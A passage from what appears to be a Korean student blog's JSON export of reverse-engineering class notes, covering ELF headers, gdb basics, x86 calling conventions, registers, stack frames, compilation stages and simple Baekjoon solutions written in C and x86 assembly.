p_vaddr; Elf64_Addr p_paddr; Elf64_Xword p_filesz; Elf64_Xword p_memsz; Elf64_Xword p_align; }; p_type : 세그먼트의 타입 (ex. PT_LOAD, PT_DYNAMIC 등) p_flags : 세그먼트 접근 권한 (읽기, 쓰기, 실행) p_offset : 파일 내 세그먼트 시작 오프셋 p_vaddr : 메모리에 로드될 가상 주소 p_paddr : 물리 주소 (대부분 시스템에선 무시됨) p_filesz : 파일에 존재하는 세그먼트 크기 p_memsz : 메모리에 할당될 세그먼트 크기 p_align : 정렬 조건 (페이지 단위 정렬 등) Section Header Table .text, .data와 같은 섹션들에 관한 정보들이 저장된다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000000318 00000318 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.gnu.pr[...] NOTE 0000000000000338 00000338 0000000000000030 0000000000000000 A 0 0 8 [ 3] .note.gnu.bu[...] NOTE 0000000000000368 00000368 0000000000000024 0000000000000000 A 0 0 4 [ 4] .note.ABI-tag NOTE 000000000000038c 0000038c 0000000000000020 0000000000000000 A 0 0 4 [ 5] .gnu.hash GNU_HASH 00000000000003b0 000003b0 0000000000000030 0000000000000000 A 6 0 8 [ 6] .dynsym DYNSYM 00000000000003e0 000003e0 0000000000000150 0000000000000018 A 7 1 8 [ 7] .dynstr STRTAB 0000000000000530 00000530 000000000000015e 0000000000000000 A 0 0 1 [ 8] .gnu.version VERSYM 000000000000068e 0000068e 000000000000001c 0000000000000002 A 6 0 2 [ 9] .gnu.version_r VERNEED 00000000000006b0 000006b0 0000000000000070 0000000000000000 A 7 2 8 [10] .rela.dyn RELA 0000000000000720 00000720 0000000000000108 0000000000000018 A 6 0 8 [11] .rela.plt RELA 0000000000000828 00000828 0000000000000060 0000000000000018 AI 6 24 8 [12] .init PROGBITS 0000000000001000 00001000 000000000000001b 0000000000000000 AX 0 0 4 [13] .plt PROGBITS 0000000000001020 00001020 0000000000000050 0000000000000010 AX 0 0 16 [14] .plt.got PROGBITS 0000000000001070 00001070 0000000000000010 0000000000000010 AX 0 0 16 [15] .plt.sec PROGBITS 0000000000001080 00001080 0000000000000040 0000000000000010 AX 0 0 16 [16] .text PROGBITS 00000000000010c0 000010c0 000000000000021c 0000000000000000 AX 0 0 16 [17] .fini PROGBITS 00000000000012dc 000012dc 000000000000000d 0000000000000000 AX 0 0 4 [18] .rodata PROGBITS 0000000000002000 00002000 0000000000000007 0000000000000000 A 0 0 4 [19] .eh_frame_hdr PROGBITS 0000000000002008 00002008 0000000000000034 0000000000000000 A 0 0 4 [20] .eh_frame PROGBITS 0000000000002040 00002040 00000000000000ac 0000000000000000 A 0 0 8 [21] .init_array INIT_ARRAY 0000000000003d88 00002d88 0000000000000008 0000000000000008 WA 0 0 8 [22] .fini_array FINI_ARRAY 0000000000003d90 00002d90 0000000000000008 0000000000000008 WA 0 0 8 [23] .dynamic DYNAMIC 0000000000003d98 00002d98 0000000000000200 0000000000000010 WA 7 0 8 [24] .got PROGBITS 0000000000003f98 00002f98 0000000000000068 0000000000000008 WA 0 0 8 [25] .data PROGBITS 0000000000004000 00003000 0000000000000010 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000004040 00003010 0000000000000240 0000000000000000 WA 0 0 64 [27] .comment PROGBITS 0000000000000000 00003010 000000000000002b 0000000000000001 MS 0 0 1 [28] .symtab SYMTAB 0000000000000000 00003040 0000000000000450 0000000000000018 29 21 8 [29] .strtab STRTAB 0000000000000000 00003490 0000000000000367 0000000000000000 0 0 1 [30] .shstrtab STRTAB 0000000000000000 000037f7 000000000000011a 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) 각 구조체에는 아래와 같은 필드들이 저장되어 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 typedef struct { Elf64_Word\tsh_name; Elf64_Word\tsh_type; Elf64_Xword\tsh_flags; Elf64_Addr\tsh_addr; Elf64_Off\tsh_offset; Elf64_Xword\tsh_size; Elf64_Word\tsh_link; Elf64_Word\tsh_info; Elf64_Xword\tsh_addralign; Elf64_Xword\tsh_entsize; } Elf64_Shdr; sh_name : 섹션 이름 (문자열 테이블의 인덱스) sh_type : 섹션 타입 (ex. SHT_PROGBITS, SHT_SYMTAB 등) sh_flags : 섹션 속성 (읽기/쓰기/실행 등) sh_addr : 실행 시 메모리에서의 가상 주소 sh_offset : 파일 내 섹션 시작 오프셋 sh_size : 섹션 크기 (바이트 단위) sh_link : 관련된 다른 섹션의 인덱스 sh_info : 섹션에 대한 부가 정보 sh_addralign : 섹션 정렬 조건 sh_entsize : 항목 크기 (테이블 형식일 경우) 실습용 코드 작성 후 명령어 실습 후 정리 실습용 코드 두 정수 값을 입력받고, 두 정수를 더하는 함수를 통해 더한 값을 출력하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int add(int a, int b) { return a + b; } int main() { int x, y; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y); printf(\u0026#34;%d\u0026#34;, add(x, y)); return 0; } 명령어 실습 gcc test.c -o test -g 명령어로 컴파일한 뒤 gdb ./test 명령어로 gdb를 실행하였다.\nlist 명령어를 통해 심볼이 남아있는 것을 확인할 수 있다.\nb main 명령어로 main 함수에 브레이크 포인트를 설정하였다.\ndisas 명령어로 어셈블리어 코드를 확인할 수 있다.\nlayout asm 명령어로 어셈블리어 코드 창을 띄워 코드를 실행하면서 확인할 수도 있다.\nn 명령어로 한 줄씩 실행해볼 수 있다. x, y에 각각 3과 7을 입력한 뒤, add 함수에 브레이크 포인트를 설정하여 함수 안으로 진입해보았다.\ninfo stack과 info frame 명령어로 함수가 호출된 것을 확인할 수 있고, 매개변수들과 지역변수의 정보들을 확인할 수 있다.\nprint 명령어로 변수의 주소를 확인하고 이를 x/w [주소] 명령어를 통해 메모리 상에 위치한 값을 직접 확인할 수 있다.\n스택 프레임의 포인터인 rbp를 통해서도 매개변수가 위치한 메모리를 확인할 수 있다.\nreturn 0 명령어를 통해 add 함수를 강제로 0으로 반환해보았다. 원래라면 10(3 + 7)이 출력되어야 하지만 0이 출력되는 것을 확인할 수 있다.\n","date":"2025-06-08T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-3%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 3차시"},{"content":"수업 내용 정리 Calling Convention 호출 규약은 함수를 호출할 때 인자를 전달하는 방식이다.\n호출 규약은 여러 가지가 있는데, 아키텍처마다도 다르다.\nx86 : 스택을 사용하여 인자를 전달한다. 예로는 cdecl, stdcall, fastcall 등이 있다.\nx64 : 인자로 레지스터를 사용하는 경우가 많고, 인자가 많은 경우에는 스택을 사용한다. 예로는 SYSV, MSCV 등이 있다.\ncdecl (x86) cdecl에서는 함수가 호출되면 인자를 스택에 저장하고, RET를 저장한 뒤 함수 주소로 이동하게 된다. 함수 종료시 Caller로 이동 후 스택을 정리한다.\nRET가 스택에 저장되므로 BOF 공격에 이용될 수 있다.\nstdcall (x86) Win32API에서 사용되는 호출 규약으로, Callee가 스택을 정리하기 때문에 안정성이 높지만 가변 인자를 사용할 수 없다.\nfastcall (x86) cdecl과 다르게 fastcall은 인자 2개까지는 ECX와 EDX에 저장해서 전달할 수 있다. 나머지는 스택을 이용해 전달한다.\nSYSV (x64) 리눅스에서 사용되는 호출 규약으로 레지스터 6개까지 인자로 사용할 수 있고(rdi, rsi, rdx, rcx, r8, r9) 나머지는 스택을 사용한다. (스택은 16바이트씩 정렬)\n백준 5문제 선택 풀이 후 x86asm으로 풀이 2438 | 별 찍기 - 1 문제 문제 링크\n첫째 줄에는 별 1개, 둘째 줄에는 별 2개, N번째 줄에는 별 N개를 찍는 문제\nClang 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;stdio.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt;= i; j++) { putchar(\u0026#39;*\u0026#39;); } putchar(\u0026#39;\\n\u0026#39;); } return 0; } 풀이 이중 반복문으로 간단히 구현할 수 있다. 외부 반복문에서는 개행을 출력하고 내부 반복문에서는 별을 출력하도록 하였다.\nx86asm 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 section .data star db \u0026#39;*\u0026#39; newline db 0x0A num db 4 dup(0) section .text global main main: call read call str_to_int call main_ mov eax, 0 ret read: mov eax, 3 mov ebx, 0 mov ecx, num mov edx, 4 int 0x80 str_to_int: xor ecx, ecx mov esi, num call .loop ret .loop: movzx edx, byte [esi] sub edx, 0x30 imul ecx, ecx, 10 add ecx, edx inc esi cmp byte[esi], 0x0A jne .loop ret main_: xor eax, eax call .loop ret .loop: push ecx inc eax mov ecx, eax push eax call .loop_ call print_newline pop eax pop ecx loop .loop ret .loop_: push ecx call print_star pop ecx loop .loop_ ret print_star: mov eax, 4 mov ebx, 1 mov ecx, star mov edx, 1 int 0x80 ret print_newline: mov eax, 4 mov ebx, 1 mov ecx, newline mov edx, 1 int 0x80 ret 풀이 data section에는 출력할 별과 개행 문자, 숫자를 입력받을 버퍼(3자리 + 개행 문자 = 4byte)를 선언해주었다.\n백준 온라인 저지에서는 main 함수에서 0이 반환되어야 정상적으로 종료되기 때문에 시작 함수를 main으로 선언하였다.\nmain 함수에서는 read, str_to_int, main_ 순으로 호출한 뒤 eax에 0을 저장하여 반환하였다. (return 0;)\nread : sys_read()를 호출하여 입력받은 숫자(문자열)를 num에 저장하였다.\nstr_to_int : 입력받은 문자열을 숫자로 변환하는 함수를 구현하였다. esi에 num의 포인터를 저장해두고 한 바이트씩 가져와 0x30을 빼서 원래 숫자 값을 구하고 10을 곱해 저장하는 것을 개행 문자까지 반복하였다.\nmain_ : 외부 반복문에서는 ecx를 카운터로 사용하여 num 만큼 내부 반복문을 호출하고 개행 문자를 출력하는 것을 반복하였다. 내부 반복문에서는 eax를 카운터로 사용하여 ecx에 복사한 뒤 별을 반복하여 출력하도록 하였다.\n1000 | A+B 문제 문제 링크\n두 정수 A와 B를 입력받은 다음, A+B를 출력하는 프로그램을 작성하시오.\nClang 코드 1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; int main() { int a, b; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;a, \u0026amp;b); printf(\u0026#34;%d\u0026#34;, a + b); return 0; } 풀이 a와 b를 입력받아 합을 출력하였다.\nx86asm 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 section .data num db 3 dup(0) buf db 2 dup(0) section .text global main main: call read call main_ mov eax, 0 ret read: mov eax, 3 mov ebx, 0 mov ecx, num mov edx, 3 int 0x80 ret main_: movzx eax, byte [num] movzx ecx, byte [num+2] add eax, ecx sub eax, 0x60 cmp eax, 10 jae .tmp add eax, 0x30 mov byte [buf], 0 mov byte [buf+1], al mov esi, buf inc esi call print2 ret .tmp: add eax, 0x26 mov byte [buf], 0x31 mov byte [buf+1], al call print1 ret print1: mov eax, 4 mov ebx, 1 mov ecx, buf mov edx, 2 int 0x80 ret print2: mov eax, 4 mov ebx, 1 mov ecx, esi mov edx, 1 int 0x80 ret 풀이 main 함수에서 read 함수와 main_ 함수를 호출하였다.\nread : sys_read()를 호출하도록 하였다.\nmain_ : 입력받은 3 바이트짜리 버퍼에서 첫 번째 바이트와 마지막 바이트를 가져와 더해주었다. 만약 10 이상이면 두 자리로 바꾸어 출력하고 아니면 한 자리만 출력하도록 하였다.\n2557 | Hello World 문제 문제 링크\nHello World!를 출력하시오.\nClang 코드 1 2 3 4 5 6 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello World!\u0026#34;); return 0; } 풀이 \u0026ldquo;Hello World!\u0026ldquo;를 출력하였다.\nx86asm 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 section .data msg db \u0026#34;Hello World!\u0026#34; section .text global main main: mov eax, 4 mov ebx, 1 mov ecx, msg mov edx, 12 int 0x80 mov eax, 0 ret 풀이 msg 변수에 \u0026ldquo;Hello World!\u0026ldquo;를 저장하고 sys_write를 호출하여 출력하였다.\n10171 | 고양이 문제 문제 링크\n아래 예제와 같이 고양이를 출력하시오.\nClang 코드 1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;\\\\ /\\\\\\n ) ( \u0026#39;)\\n( / )\\n \\\\(__)|\\n\u0026#34;); return 0; } 풀이 이스케이프 문자를 통해 특수 문자를 빠짐없이 출력하였다.\nx86asm 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 section .data msg db \u0026#34;\\ /\\\u0026#34;, 0x0A, \u0026#34; ) ( \u0026#39;)\u0026#34;, 0x0A, \u0026#34;( / )\u0026#34;, 0x0A, \u0026#34; \\(__)|\u0026#34; section .text global main main: mov eax, 4 mov ebx, 1 mov ecx, msg mov edx, 32 int 0x80 mov eax, 0 ret 풀이 개행 문자를 추가하여 sys_write를 호출하였다.\n5338 | 마이크로소프트 로고 문제 문제 링크\n마이크로소프트 로고를 예제 출력처럼 출력하는 프로그램을 작성하시오.\nClang 코드 1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34; _.-;;-._\\n\u0026#39;-..-\u0026#39;| || |\\n\u0026#39;-..-\u0026#39;|_.-;;-._|\\n\u0026#39;-..-\u0026#39;| || |\\n\u0026#39;-..-\u0026#39;|_.-\u0026#39;\u0026#39;-._|\u0026#34;); return 0; } 풀이 개행 문자를 추가하여 한 줄로 출력하였다.\nx86asm 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 section .data msg db \u0026#34; _.-;;-._\u0026#34;, 0x0A, \u0026#34;\u0026#39;-..-\u0026#39;| || |\u0026#34;, 0x0A, \u0026#34;\u0026#39;-..-\u0026#39;|_.-;;-._|\u0026#34;, 0x0A, \u0026#34;\u0026#39;-..-\u0026#39;| || |\u0026#34;, 0x0A, \u0026#34;\u0026#39;-..-\u0026#39;|_.-\u0026#39;\u0026#39;-._|\u0026#34; section .text global main main: mov eax, 4 mov ebx, 1 mov ecx, msg mov edx, 83 int 0x80 xor eax, eax ret 풀이 개행 문자의 아스키 코드인 0x0A를 추가하여 msg에 저장한 뒤, sys_write를 호출하였다\nDreamhack x86-assembly-2 학습 ","date":"2025-06-01T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-2%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 2차시"},{"content":"수업 내용 블로그 정리 리버싱이란? 리버싱은 리버스 엔지니어링(Reverse Engineering)의 약자로, RCE(Reverse Code Engineering)라고도 부른다.\n말 그대로 역으로 엔지니어링을 하는 행위이다. 컴퓨터에서 엔지니어링이라고 하면 프로그램을 개발하는 것이라고 할 수 있는데, 개발을 역으로 하면 완성된 프로그램을 해체하고 분석하여 프로그램의 이해를 목표로 하는 행위이다.\n분석 방법 리버스 엔지니어링에서는 분석하는 방법을 크게 두 가지로 나눌 수 있다.\n정적 분석 : 프로그램 파일의 기계어나 디스어셈블된 어셈블리어, 혹은 디컴파일된 의사 코드를 통해 코드를 분석한다. 소스 코드를 보고 프로그램의 동작을 이해하는 것과 비슷하다고 할 수 있다.\n동적 분석 : 프로그램을 실행하여 레지스터나 프로세스의 메모리 등을 통해 분석한다. 디버깅과 같은 작업이 이에 해당한다.\nx86-64 아키텍처란? 먼저 아키텍처는 명령어를 처리하는 CPU의 구조를 말하며, 용도에 따라 여러 종류가 있다.\nx86 x86-64 ARM ARM64 레지스터 크기 32bit 64bit 32bit 64bit 레지스터 종류 eax, ebx rax, rbx R0 ~ R15 X0 ~ X30 용도 임베디드, 32비트 호환용 데스크탑, 노트북, 서버 저전력 임베디드 시스템, 스마트폰, 태블릿, IoT 고성능 저전력 스마트폰, 노트북 여기서 x86-64 아키텍처는 에뮬레이션 없이 x86을 지원하는 64bit 아키텍처이다. x86 아키텍처만 존재하던 시절에 x86-64 아키텍처의 등장으로 오랜 기간 동안 구형 프로그램의 호환을 유지할 수 있었다.\nx86-64 아키텍처를 사용하는 프로세서는 대표적으로 Intel과 AMD의 프로세서가 있다.\nWORD란? 위에서 아키텍처를 레지스터 크기에 따라 분류하였는데, 이 레지스터 크기, 즉 CPU가 한 번에 처리할 수 있는 데이터의 크기를 WORD라고 한다.\n하지만 자료형을 나타내는 WORD는 전통적으로 초기 컴퓨터의 레지스터 크기인 16bit, 즉 2byte를 나타낸다.\nWORD의 2배, 4배 크기를 나타내는 DWORD, QWORD 또한 존재한다.\nRegisters 64비트와 32비트 모두 용도는 같기 때문에 혼동을 방지하기 위해 prefix는 생략하였다.\n범용 레지스터 말 그대로 범용적으로 사용하는 레지스터이다. 주로 사용되는 용도가 있다.\nAX (Accumulator Register) : 산술 및 논리 연산에 주로 사용되며, 함수의 반환값을 저장한다. BX (Base Register) : 메모리 주소 계산에 주로 사용된다. CX (Counter Register) : 반복적인 연산에서 루프 제어를 사용할 때 카운터로 사용된다. DX (Data Register) : 큰 수의 곱셈과 나눗셈에서 AX 레지스터를 보조하여 사용된다. DI (Destination Index) : 문자열 처리나 배열의 인덱스로 사용되며, 문자열 복사나 비교에서 대상의 인덱스를 가리킨다. SI (Source Index) : 문자열 처리나 배열의 인덱스로 사용되며, 문자열 복사나 비교에서 원본 데이터를 가리킨다. 포인터 레지스터 말 그대로 특정 메모리의 위치를 카리키는 포인터 역할을 하는 레지스터이다.\nSP (Stack Pointer) : 스택의 최상단(가장 낮은 주소)을 가리킨다. BP (Base Pointer) : 스택의 최하단(가장 높은 주소)을 가리킨다. IP (Instruction Pointer) : 다음에 실행될 명령어의 주소를 가리킨다. 세그먼트 레지스터 세그먼트에 접근하기 위한 레지스터이다.\nCS (Code Segment) : 코드 영역을 가리킨다. DS (Data Segment) : 데이터 영역을 가리킨다. SS (Stack Segment) : 스택 영역을 가리킨다. ES (Extended Segment) : 추가적인 영역으로 문자열이나 데이터를 처리할 때 사용한다. GS (General Segment) : 일반적으로 사용되는 세그먼트 레지스터로, 주로 스레드에 관련된 데이터가 저장된다. FS (Frame segment) : 스택 프레임을 관리하는 데 사용되며, 함수 호출 시 스택 구조를 처리할 때 주로 사용된다. 플래그 레지스터 산술 연산 결과의 상태를 저장하거나 외부 인터럽트나 데이터의 흐름을 관리하는 레지스터이다.\n상태 플래그 ZF (Zero Flag) : 연산 결과가 0일 때 설정된다. CF (Carry Flag): Unsigned overflow가 발생할 때 설정된다. OF (Overflow Flag) : Signed overflow가 발생할 때 설정된다. SF (Sign Flag) : 연산 결과의 부호 비트와 같게 설정된다. AF (Auxiliary Flag) : 연산 결과의 하위 4bit에 Unsigned overflow가 발생할 때 설정된다. PF (Parity Flag) : 연산 결과의 1인 비트의 합이 짝수일 때 설정된다. 컨트롤 플래그 TF (Trap Flag) : 명령어를 한 줄 실행할 때마다 인터럽트를 발생시킨다. (예로 디버거의 한 줄씩 실행 등에서 사용된다.)\nIF (Interrupt enable Flag) : 1일 때는 외부 인터럽트가 무시되고, 0일 때는 외부 인터럽트를 받아들인다. (외부 인터럽트는 사용자의 키보드 입력과 같은 하드웨어의 신호를 의미한다.)\nDF (Direction Flag) : 0일 때는 데이터 주소를 가리키는 레지스터의 값이 증가하고, 1일 때는 감소한다.\n이해가 잘 안 되어서 찾아보았더니 아래와 같이 쓰인다고 한다. 디버깅 할 때 자주 보았던 것 같다.\n1 2 3 4 5 CLD ; DF = 0 MOVSB ; [ES:DI] ← [DS:SI], SI++, DI++ STD ; DF = 1 MOVSB ; [ES:DI] ← [DS:SI], SI--, DI-- 어셈블리어로 출력 반복문 작성 코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 section .data ; 데이터 영역에 초기화된 전역 변수 저장 msg db \u0026#34;Hello Layer7\u0026#34;, 0xA ; 출력할 문자열과 개행 문자 (0xA : \u0026#39;\\n\u0026#39;) 저장 len equ $ - msg ; 문자열 길이 저장 (= 현재 주소 - 문자열 주소) section .text ; 텍스트 영역에 실행할 코드 저장 global _start ; 시작 함수 선언 _start: ; _start 함수 코드 시작 mov cl, 12 ; 카운터에 12 저장 call print ; print 함수 호출 mov eax, 1 ; 첫 번째 인자 설정 (1 : sys_exit) xor ebx, ebx ; 두 번째 인자 설정 (0 : EXIT_SUCCESS) int 0x80 ; 시스템 호출 print: ; print 함수 코드 시작 push ecx ; 카운터 스택에 저장 mov eax, 4 ; 첫 번째 인자 설정 (4 : sys_write) mov ebx, 1 ; 두 번째 인자 설정 (1 : stdout) mov ecx, msg ; 세 번째 인자 설정 (출력할 문자열) mov edx, 14 ; 네 번째 인자 설정 (문자열 길이) int 0x80 ; 시스템 호출 pop ecx ; 스택에 저장한 카운터 복구 loop print ; 카운터 1 감소 및 0이 될 때 까지 반복 ret ; 반환 풀이 대부분의 내용은 주석으로 작성하였기에 필요한 일부만 풀이하였다.\n$는 현재 코드의 주소를 의미한다. $ - msg는 msg 문자열의 바로 다음 줄인 현재 코드의 주소에서 문자열의 주소를 빼서 문자열의 길이를 구할 수 있다.\n시스템 호출은 System Call Table을 참조하여 각각의 인자를 찾아서 작성하였다.\nprint 함수를 호출할 때 ecx를 스택에 저장하고 시스템 호출 뒤에 다시 복구한 이유는 print 함수를 호출하면서 세 번째 인자로 ecx가 쓰이기 때문에 카운트 된 값은 스택에 저장해두었다.\nx86-64 함수 호출 규약이란? 함수를 호출할 때 인자를 전달하는 방식에 대한 약속이다.\n크게 세 가지로 나눌 수 있고, 64bit에서는 오로지 하나의 함수 호출 규약만 지원한다.\n__cdecl C declaration의 약자로, C언어에서 기원한 호출 규약이다.\nC언어에서 사용되며, 인자를 역순으로 스택에 저장한다.\n함수 호출이 반환되면 호출자(해당 함수를 호출한 함수)가 스택에서 인자들을 제거하여 Stack Pointer를 원상복구 시킨다.\n__stdcall Win32 API, C++ 등의 표준 규약이다.\n인자를 역순으로 스택에 저장한다.\n함수 호출이 반환되면 피호출자(호출된 함수)가 스택에서 인자들을 제거하여 Stack Pointer를 원상복구 시킨다.\n__fastcall 표준화된 규약이 아니라서 컴파일러에 따라 처리가 다르다.\n첫 번째와 두 번째 인자는 각각 ECX, EDX에 저장하고 나머지는 역순으로 스택에 저장한다.\n함수 호출이 반환되면 호출자(해당 함수를 호출한 함수)가 스택에서 인자들을 제거하여 Stack Pointer를 원상복구 시킨다.\n함수 프롤로그 및 에필로그란? 함수에서의 프롤로그와 에필로그는 각각 함수의 시작 전과 함수의 반환 전 스택 프레임을 설정해주는 것을 말한다.\n스택 프레임이란? 함수가 호출될 때 생성되고, 반환될 때 해제되는 공간으로, 함수마다의 스택 영역을 구분한다.\n스택 프레임에는 다음과 같은 값들이 저장된다.\nRET (RETurn address) SFP (이전 함수의 Base Pointer) 지역 변수 및 인자 함수 프롤로그 1 2 push ebp ; 호출 전 함수의 Base Pointer를 스택에 저장 mov ebp, esp ; Base Pointer를 Stack Pointer 값으로 저장 위와 같이 스택 프레임을 생성할 때 설정하는 과정을 프롤로그라고 한다.\nStack Pointer\n함수 에필로그 1 2 leave ret 위와 같이 스택 프레임을 복구하고 반환하는 과정을 에필로그라고 한다.\nleave와 ret 명령어가 내부적으로 실행하는 명령어는 아래와 같다.\n1 2 3 4 mov esp, ebp ; Stack Pointer를 Base Pointer(Frame Pointer)로 복구 pop ebp ; 해당 함수 호출 전 Base Pointer 복구 pop eip ; RET eip에 저장 jmp eip ; RET로 이동 정리 프롤로그에서 기존 Base Pointer를 스택에 저장한 뒤 Base Pointer를 Stack Pointer로 설정한다.\n함수가 진행됨에 따라 Stack Pointer가 감소하면서 Base Pointer부터 낮은 주소에 값이 쌓이게 된다.\n함수 진행 중 함수가 호출되면 감소된 Stack Pointer가 Base Pointer가 되고 그 주소부터 다시 낮은 주소로 값이 쌓인다.\n따라서 호출 전 함수의 값들은 사라지지 않고 새로운 스택 프레임이 생성된다.\n에필로그에서는 자라난 스택을 원래 Stack Pointer 위치를 새 스택 프레임의 포인터로 복구하면서 다음 명령어로 이동한다.\n","date":"2025-05-27T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EB%A6%AC%EB%B2%84%EC%8B%B1-1%EC%B0%A8%EC%8B%9C/","title":"Layer7 리버싱 1차시"},{"content":"수업 내용 정리 메모리 구조 프로그램을 실행하려면 메모리에 프로그램이 로드되어야 한다.\n메모리에는 프로그램에서 용도에 따라 사용되는 공간을 5가지 영역으로 나눌 수 있다.\ntext 영역 프로그램의 실제 코드(기계어)가 저장되는 영역이다. 메모리의 가장 낮은 주소에 저장된다. 프로그램이 종료될 때까지 메모리에 저장된다. data 영역 GVAR(초기화된 전역 변수와 정적 변수)이 저장되는 영역이다. 프로그램이 종료될 때까지 메모리에 저장된다. bss 영역 초기화되지 않은 전역 변수나 정적 변수들이 저장되는 영역이다. 프로그램 실행 시 그 값이 0으로 초기화된다. 실행 파일에 저장되지 않는다. heap 영역 동적으로 할당되는 메모리 영역이다. 선입선출(FIFO, First In First Out) 방식이다. 런타임 시 크기가 결정된다. stack 영역 함수 호출과 지역 변수 선언 시에 사용되는 영역이다. 함수마다 스택 프레임이 생성되며 함수 반환 시 소멸된다. 후입선출(LIFO, Last In First Out) 구조이다. 컴파일 C언어에서의 컴파일은 전처리 과정에서 주석과 띄어쓰기를 제외한 뒤, 필요한 헤더 파일을 소스 코드로 복사하여 전처리된 파일인 .i 확장자 파일로 만든다.\n이후 전처리된 파일을 저수준 언어인 어셈블리어로 변환한다. 이 과정을 컴파일이라고 하며, .s 확장자를 사용한다.\n다음으로 저수준 언어인 어셈블리어를 기계어로 변환하는 과정을 거친다. CPU가 읽고 해석할 수 있는 오브젝트 파일로 변환되며, .o 확장자를 사용한다.\n마지막으로, 오브젝트 파일과 프로그램 실행에 필요한 라이브러리 파일들을 결합하여 실행 파일로 만든다. 이 과정을 링킹이라고 하며, 실행 파일의 경우 운영체제나 아키텍쳐에 따라 다르다.\n이 과정을 요약해보자면 아래와 같다.\n전처리 -\u0026gt; 어셈블리 -\u0026gt; 컴파일 -\u0026gt; 링킹\ngcc -S : 어셈블리어 파일로 컴파일\n-c : 오브젝트 파일로 컴파일\n-o : 실행 파일로 컴파일\n인터프리터 인터프리터는 크게 Lexer와 Parser로 구성된다.\nLexer에는 파이썬 코드가 입력되어 식별자, 상수, 연산자 등의 토큰으로 구별하여 Parser가 이를 AST라는 분석 트리를 생성한다.\nLexer 소스 코드를 받아 식을 식별자, 상수, 연산자 등으로 나누어 토큰으로 반환한다.\n1 2 # 예시 x = 7 - 3 + 1 위 코드에서는 x는 식별자, =, -, +는 연산자, 7, 3, 1은 상수가 된다. Parser Lexer로 나눈 토큰들을 추상 구문 트리(AST) 형태로 만든다.\n위 식을 예로 들자면, 식별자 x, 대입 연산자 =, 연산식 중에서 연산식을 연산하는 값들을 연산자의 자식으로 나타내어 트리 형태로 만든다.\n아래 파이썬 코드를 통해 확인해볼 수 있다.\n1 2 3 4 5 6 7 8 9 import ast code = \u0026#34;\u0026#34;\u0026#34; x = 7 - 3 + 1 \u0026#34;\u0026#34;\u0026#34; tree = ast.parse(code) print(ast.dump(tree)) # output : Module(body=[Assign(targets=[Name(id=\u0026#39;x\u0026#39;, ctx=Store())], value=BinOp(left=BinOp(left=Constant(value=7), op=Sub(), right=Constant(value=3)), op=Add(), right=Constant(value=1)))], type_ignores=[]) Codeup 문제 정리 1266 | n개의 수의 합 문제 링크\n문제 수의 개수 n이 주어지고, 그 다음 줄에 무작위로 n개의 정수가 입력된다.\nn개의 수의 합을 출력하시오.\n풀이 반복문을 통해 n개의 수를 입력받아 총합을 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main() { int n, num, sum = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;num); sum += num; } printf(\u0026#34;%d\u0026#34;, sum); return 0; } 컴파일 전처리 1 2 ~/Documents/Coding via C v13.3.0-gcc ❯ gcc -E test.c -o test.i gcc의 -E 옵션을 사용하여 전처리 파일을 생성하였다.\n확인해보면 헤더 파일에서 가져온 함수들이 보이고, 맨 아래에는 내가 작성한 코드가 있는 것을 확인할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ... extern int getc_unlocked (FILE *__stream) __attribute__ ((__nonnull__ (1))); extern int getchar_unlocked (void); # 600 \u0026#34;/usr/include/stdio.h\u0026#34; 3 4 extern int fgetc_unlocked (FILE 